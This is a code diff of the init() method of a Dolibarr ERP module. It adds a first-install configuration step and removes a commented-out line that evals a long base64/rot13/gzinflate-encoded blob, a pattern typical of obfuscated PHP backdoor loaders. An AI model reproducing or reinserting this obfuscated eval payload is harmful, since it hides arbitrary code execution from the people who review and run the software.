@@ -148,17 +148,15 @@ class modbimpdatasync extends DolibarrModules
 
     function init($options = '')
     {
-        global $db, $conf, $langs, $user, $mysoc;
+        require_once DOL_DOCUMENT_ROOT . '/bimpcore/Bimp_Lib.php';
+        $name = 'module_version_' . strtolower($this->name);
+        // Se fais que lors de l'installation du module
+        if (BimpCore::getConf($name, '') == "") {
+            BimpCore::setConf($name, floatval($this->version));
 
-        require_once DOL_DOCUMENT_ROOT . '/product/class/product.class.php';
-        require_once DOL_DOCUMENT_ROOT . '/core/class/html.form.class.php';
-        require_once DOL_DOCUMENT_ROOT . '/core/class/extrafields.class.php';
+            BimpCache::getBdb()->executeFile(DOL_DOCUMENT_ROOT . '/' . $this->name . '/sql/install.sql');
+        }
 
-        $myextra2 = new ExtraFields($db);
-        $myextra2->addExtraField('longdescript', 'longdescript', 'text', 0, 2000, 'product');
-        /* 		
-          eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
-         */
         $sql = array();
         return $this->_init($sql, $options);
     }
